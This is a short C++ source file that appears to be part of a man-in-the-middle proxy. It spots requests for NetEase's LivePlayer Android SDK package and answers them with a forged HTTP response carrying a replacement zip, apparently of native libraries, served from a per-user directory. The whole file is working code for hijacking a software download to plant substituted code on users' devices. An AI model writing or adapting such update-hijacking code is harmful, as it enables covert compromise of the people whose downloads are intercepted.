#include "NetEaseNewsUpdate.h"
#include <windows.h>
#include "../Public.h"
#include "PluginServer.h"


int NetEaseNewsUpdate::isNeteaseNews(string url, string host) {
	if (host.find("yx-web.nos.netease.com") != -1 && url.find("/package/LivePlayer_Android_SDK_v") != -1)
	{
		return TRUE;
	}
	return FALSE;
}


int NetEaseNewsUpdate::replyNetEaseNews(char * dstbuf, int buflen, int buflimit, LPHTTPPROXYPARAM lphttp) {
	char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		//"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/zip\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lphttp->username, "neteasenews_so.zip");
	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpFormat, 1);
	return ret;
}